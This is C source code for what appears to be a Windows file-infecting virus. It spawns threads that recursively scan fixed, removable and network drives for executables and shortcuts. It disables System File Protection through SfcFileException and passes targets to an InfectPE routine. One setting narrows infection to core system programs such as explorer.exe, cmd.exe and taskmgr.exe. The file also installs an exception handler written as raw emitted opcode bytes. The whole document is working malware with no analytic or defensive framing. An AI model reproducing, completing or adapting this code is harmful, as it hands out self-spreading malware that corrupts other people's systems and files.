
#ifdef dbgdbg
 #define NOSLEEP
 #define SCANONCE //scan each drive only once
#endif

HANDLE htrd[0xFF];      //@S
DWORD  drvl[0xFF];
DWORD sdelay;           //@E // service delay

void rscanSehSafeCode();

///////////////////////////////////////////////////////

void rscanSehHandler()
{
#ifdef _MSC_VER
	 /* */
	_asm
	{
		_emit 0x55							//   push   ebp
		_emit 0x89; _emit 0xE5				//   mov    ebp,esp
		_emit 0x60							//   pushad

		// now [EBP+08h]=pointer to EXCEPTION_RECORD
		//     [EBP+0Ch]=pointer to ERR structure 
		//     [EBP+10h]=pointer to CONTEXT

		// set EIP in CONTEXT structure

		_emit 0x8B; _emit 0x75; _emit 0x10	//   mov    esi,dword ptr [ebp+10]
		mov eax, rscanSehSafeCode			//   mov    eax,SehSafeCode
		_emit 0x89; _emit 0x86; _emit 0xB8	//   mov    dword ptr [esi+000000B8],eax
		_emit 0x00; _emit 0x00; _emit 0x00

		// set ESP (equal to pointer to ERR structure) in CONTEXT
		_emit 0x8B; _emit 0x45; _emit 0x0C	//   mov    eax,dword ptr [ebp+0C]
		_emit 0x89; _emit 0x86; _emit 0xC4	//   mov    dword ptr [esi+000000C4],eax
		_emit 0x00; _emit 0x00; _emit 0x00

		_emit 0x61							//   popad
		_emit 0x89; _emit 0xEC				//   mov    esp,ebp
		_emit 0x5D							//   pop    ebp
		_emit 0x31; _emit 0xC0				//   xor    eax,eax ; "reload CONTEXT"
		_emit 0xC3							//   ret
	}
#else
	_asm
	(
	 ".byte 0x55                    \n"  //   push   ebp
	 ".byte 0x89,0xE5               \n"  //   mov    ebp,esp
	 ".byte 0x60                    \n"  //   pushad

	 // now [EBP+08h]=pointer to EXCEPTION_RECORD
	 //     [EBP+0Ch]=pointer to ERR structure 
	 //     [EBP+10h]=pointer to CONTEXT

	 // set EIP in CONTEXT structure

	 ".byte 0x8B,0x75,0x10          \n"  //   mov    esi,dword ptr [ebp+10]
	 "movl $_rscanSehSafeCode,%eax\n"    //   mov    eax,SehSafeCode
	 ".byte 0x89,0x86,0xB8,0,0,0    \n"  //   mov    dword ptr [esi+000000B8],eax

	 // set ESP (equal to pointer to ERR structure) in CONTEXT
	 ".byte 0x8B,0x45,0x0C          \n"  //   mov    eax,dword ptr [ebp+0C]
	 ".byte 0x89,0x86,0xC4,0,0,0    \n"  //   mov    dword ptr [esi+000000C4],eax

	 ".byte 0x61                    \n"  //   popad
	 ".byte 0x89,0xEC               \n"  //   mov    esp,ebp
	 ".byte 0x5D                    \n"  //   pop    ebp
	 ".byte 0x31,0xC0               \n"  //   xor    eax,eax ; "reload CONTEXT"
	 ".byte 0xC3                    \n"  //   ret
	);
#endif
}

///////////////////////////////////////////////////////

void rscanSehSafeCode()
{
	_ExitThread(1);
}

///////////////////////////////////////////////////////

void ProcessLNK(char *st)
{
	HANDLE h;
	DWORD len;                             //@E
	int r;
	char tmp[MAX_PATH];
	WORD itemidsz, flocinfo, finpatho;
	char exe[0xFFFF];
	char lnk[0x1FFF];     //@E
	DWORD l;

	my_strcpy(tmp, st);
	tmp[strlen(tmp) - 1] = 0; //@S

	// read shortcut
	h = _CreateFile(tmp,GENERIC_READ | FILE_SHARE_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (h == INVALID_HANDLE_VALUE) return; //@S

	
	r = _ReadFile(h, lnk, sizeof(lnk), &len, NULL);
	_CloseHandle(h);
	if (r == 0) return;        //@S

	if (lnk[0] != 'L') return; //@E  // not shortcut

	itemidsz = MAKEWORD(lnk[0x4c], lnk[0x4d]);
	flocinfo = /*@S+*/itemidsz + 78/*@E*/; //78=0x4c+2

	if (/*@S==*/lnk[flocinfo]   == 0/*@E*/) return; // no file location info
	if (/*@S!=*/lnk[flocinfo+8] != 1/*@E*/) return; // 1==regular local file

	finpatho = flocinfo+MAKEWORD(lnk[/*@S+*/flocinfo+16/*@E*/],lnk[/*@S+*/flocinfo+17/*@E*/]);
	
	my_strcpy(exe,&lnk[finpatho]);
	l = strlen(exe);

	if(/*@S||*/(exe[l-4]!='.')||(__toupper(exe[l-3])!='E')||(__toupper(exe[l-2])!='X')||(__toupper(exe[l-1])!='E')/*@E*/) 
		return;

 #ifdef dbgdbg
	adddeb("\nLNK: %s",tmp);
 #endif

	_strcat(exe,"\\"); 
	ProcessEXE(exe,0,TRUE);
}


///////////////////////////////////////////////////////
// Process exe - SFP & call InfectPE

BOOL ProcessEXE(char *st, DWORD delay, BOOL CUT_LAST_CHR)
{
	unsigned char tmp[MAX_PATH]; //@S
	BOOL ires;                   //@E
	unsigned char wf[MAX_PATH*2+10]; // unicode buffer
	DWORD q;
	BOOL IsSFP;

	my_strcpy(tmp,st);
	if (/*@S==*/CUT_LAST_CHR==TRUE/*@E*/) tmp[strlen(tmp)-1]=0;

 #ifdef dbgdbg
	adddeb("\r\n=== ProcessEXE: %s CUT_LAST_CHR:%i (0==FALSE==service_infect)",tmp,CUT_LAST_CHR);
 #endif

	if (/*@S&&*/(VIRULENCE > 100) && (CUT_LAST_CHR == TRUE)/*@E*/) // INFECT ONLY SOME FILES
	{
		ires = FALSE;
		if (serstr(st,"xplorer.",1) != 0xFFFF) ires = TRUE; //@S // explorer
		if (serstr(st,"xplore.",1)  != 0xFFFF) ires = TRUE;      // iexplore
		if (serstr(st,"cmd.",1)     != 0xFFFF) ires = TRUE;      
		if (serstr(st,"init.",1)    != 0xFFFF) ires = TRUE;      // wininit, userinit, rdpinit
		if (serstr(st,"rundll32.",1)!= 0xFFFF) ires = TRUE;       
		if (serstr(st,"taskmgr.",1) != 0xFFFF) ires = TRUE; //@E 

	 #ifdef dbgdbg
		adddeb("=== ProcessEXE VIRULENCE>100 ires:%i (0==SKIP)",ires);
	 #endif

		if (ires == FALSE) 
			return FALSE;
	}

	#ifndef NOSLEEP
	 __sleep(delay);
	#endif

	if (MAJORW > 5) goto infect; // 6 or later - skip SFP check (Vista, WS2008, W7)
	                             // it seems like SFP_OS is obsolete and protection
	                             // is working through owner rights (ThrustedInstaller, etc)
	 //--- Check SFP 

 #ifdef dbgdbg
	adddeb("=== ProcessEXE MAJORW_%u<=5 (2K,XP,WS2003 or less) - Check SFP",MAJORW);
 #endif	

	for (q = 0;; q++)
	{
		DWORD q2 = /*@S**/ q * 2 /*@E*/;

		wf[q2]                = tmp[q];  //@S
		wf[/*@S+*/q2+1/*@E*/] = 0;       //@E

		if (tmp[q] == 0) 
		{
			wf[/*@S+*/ q2 + 2 /*@E*/]=0; //@S
			wf[/*@S+*/ q2 + 3 /*@E*/]=0; //@E 
			break; 
		}
	}

	//--- Check sfc.dll presence

	if (/*@S==*/_SFC == NULL/*@E*/) goto infect; // 9X/ME - no sfc.dll

	//--- 

	IsSFP = _SfcIsFileProtected(NULL, wf);
	 
	if (/*@S!=*/IsSFP == 0/*@E*/) goto infect; // no protection

 #ifdef dbgdbg
	adddeb("=== ProcessEXE SfcIsFileProtected:YES (%s)",tmp);
 #endif

	//--- Check sfc_os.dll presence

	if (/*@S!=*/_SFC_OS != NULL/*@E*/) // sfc_os (XP) SFP 1 minute disable
	{
		DWORD r;

		#ifdef dbgdbg
		 adddeb("=== ProcessEXE _SfcFileException:%X",_SfcFileException);
		#endif

		r = _SfcFileException(NULL, wf, -1);   // original variant

	 #ifdef dbgdbg
		adddeb("=== ProcessEXE sfc_os!exp.5 (%s) r:%u (r!=0 is failed)",tmp,r);
	 #endif

		if (/*@S!=*/ r != 0 /*@E*/) { ires=FALSE; goto skipinf; }
	} 
	else goto skipinf; //no sfc_os - win2k 

	//---

	infect:;

	ires = InfectPE(tmp);

	skipinf:;

 #ifdef dbgdbg
	 if (ires) { adddeb("=== ProcessEXE INFECTED OK (%s)",tmp); }
	      else { adddeb("=== PeocessEXE INFECT FAILED (%s)",tmp); }
 #endif

	return ires;
}

///////////////////////////////////////////////////////

void rscan(char *st, DWORD dr, BOOL LNK)
{
	HANDLE i;    //@S  // hFindFile
	DWORD delay; //@E
	char dx[10]; //@E

	WIN32_FIND_DATA f;  //@S
	char tmp[MAX_PATH]; 
	BOOL bl=TRUE;       //@E
	DWORD lst;

	if (LNK) { delay=0; goto skipnotlnk; }

	if (/*@S==*/drvl[dr]==0/*@E*/)
	{
	 #ifdef dbgdbg
		adddeb("THREAD EXIT from rscan %c:\\",dr);
	 #endif
		_FindClose(i);
		_ExitThread(1);
	}

	delay = 100;   //@S

	_sprintf(dx, "%c:\\", dr);
	if (_GetDriveType(dx) == DRIVE_FIXED) delay = 300;

	if (VIRULENCE > 100) delay = 30; // INFECT ONLY SOME FILES (EXPLORER.EXE, etc...)

	skipnotlnk:;

	bl = TRUE;

	_sprintf(tmp,"%s*",st); //@S
	lst=strlen(st);   //@E

 #ifdef dbgdbg
	// adddeb("%s",tmp);
 #endif

	if (st[lst-5] == '.')
	{
		unsigned char tm4=__toupper(st[lst-4]); //@S
		unsigned char tm3=__toupper(st[lst-3]);
		unsigned char tm2=__toupper(st[lst-2]); //@E

		if (/*@S&&*/(tm4=='L')&&(tm3=='N')&&(tm2=='K')/*@E*/) ProcessLNK(st);            //@S
		if (/*@S&&*/(tm4=='E')&&(tm3=='X')&&(tm2=='E')/*@E*/) ProcessEXE(st,delay,TRUE); //@E // CUT_LAST_CHAR==TRUE
	}

	i = _FindFirstFile(tmp,&f);
	if(/*@S==*/i==(HANDLE)0xFFFFFFFF/*@E*/) return;

	if (f.cFileName[0]!='.') { _sprintf(tmp,"%s%s\\",st,f.cFileName); rscan(tmp,dr,LNK); }

	while(bl)
	{
		bl=_FindNextFile(i,&f);
		if(/*@S==*/bl==0/*@E*/)
		{
		 #ifndef NOSLEEP
			__sleep(/*@S+*/delay+sdelay/*@E*/);
		 #endif

			_FindClose(i);
			return;
		}
		if (f.cFileName[0]!='.') 
		{ _sprintf(tmp,"%s%s\\",st,f.cFileName); rscan(tmp,dr,LNK); }
	}                           

}

///////////////////////////////////////////////////////

DWORD WINAPI InfectDrive(DWORD *dr)
{
	char dx[10];

	// Set thread SEH handler
 #ifdef _MSC_VER
	_asm
	{
		push  rscanSehHandler				
		_emit 0x67; _emit 0x64; _emit 0xFF; _emit 0x36; _emit 0x00; _emit 0x00	
		_emit 0x67; _emit 0x64; _emit 0x89; _emit 0x26; _emit 0x00; _emit 0x00	
	}
 #else
	_asm
	(      
		"pushl $_rscanSehHandler\n"              // push   SehHandler
		".byte 0x67,0x64,0xFF,0x36,0x00,0x00 \n" // push   dword ptr fs:[0000]
		".byte 0x67,0x64,0x89,0x26,0x00,0x00 \n" // mov    dword ptr fs:[0000],esp
	 );
 #endif

 
	_sprintf(dx, "%c:\\", *dr);

 #ifdef dbgdbg
	adddeb("DRIVE %s INFECT THREAD STARTED",dx);
 #endif

 rloop:;
	rscan(dx,*dr,FALSE); //@S
	__sleep(0);          //@E

 #ifdef SCANONCE
	adddeb("DRIVE %s SCAN FINISHED",dx);
	soloop:; __sleep(0); goto soloop;
 #endif

	goto rloop;
}

///////////////////////////////////////////////////////
// Infect Thread

DWORD WINAPI InfectAllDrives(DWORD *prm)
{
	DWORD dr;

 #ifdef NO_INFECT
	return 0;
 #endif

 #ifdef dbgdbg
	adddeb("VIRULENCE: %u (if > 150 == HACK TERM MODE, return)",VIRULENCE);
 #endif

	if (VIRULENCE > 150) return 0;                  //@S

	for (dr = 'C'; dr <= 'Z'; dr++) htrd[dr]=NULL; //@E // init drive array

	// get all drives

	loop:;
	for (dr='C'; dr<='Z'; dr++)
	{
		DWORD tid; //@E
		DWORD spc; //@S
		DWORD bps;
		DWORD nfc;
		DWORD tnc; //@E
		DWORD dt, ec=0;
		char dx[10]; 
		_sprintf(dx,"%c:\\",dr); //@S
		__sleep(0);              //@E

		 // check thread
		if (/*@S==*/htrd[dr] == NULL/*@E*/) goto cont;
		
		_GetExitCodeThread(htrd[dr], &ec);
		if (ec == STILL_ACTIVE) goto cont;

	 #ifdef dbgdbg
		adddeb("THREAD %s DEAD",dx);
	 #endif

		_CloseHandle(htrd[dr]); htrd[dr]=NULL;

		 // check drive
	 cont:;
		dt = _GetDriveType(dx);

		if (/*@S&&*/(dt!=DRIVE_FIXED)&&(dt!=DRIVE_REMOTE)&&(dt!=DRIVE_REMOVABLE)/*@E*/)
		{
			if (/*@S!=*/htrd[dr] != NULL/*@E*/) 
				drvl[dr] = 0; // thread without drive
			continue;
		}

		_SetErrorMode(SEM_FAILCRITICALERRORS); // disable os critical error

		 // check removeable drives

		if (/*@S==*/_GetDiskFreeSpace(dx, &spc, &bps, &nfc, &tnc) == 0/*@E*/)
		{
			if (/*@S!=*/htrd[dr]!=NULL/*@E*/) 
				drvl[dr] = 0; // thread without drive
			continue;
		}

		if (/*@S!=*/htrd[dr] != NULL/*@E*/) continue; // thread already started & still alive

		if ((VIRULENCE > 50) && (dt != DRIVE_FIXED)) continue;

		// create new thread
		drvl[dr] = dr; //@S
		htrd[dr] = _CreateThread(NULL, 0, InfectDrive, &drvl[dr], 0, &tid); 
	}

	// count infect delay
	
	__sleep(0);
	goto loop;
}    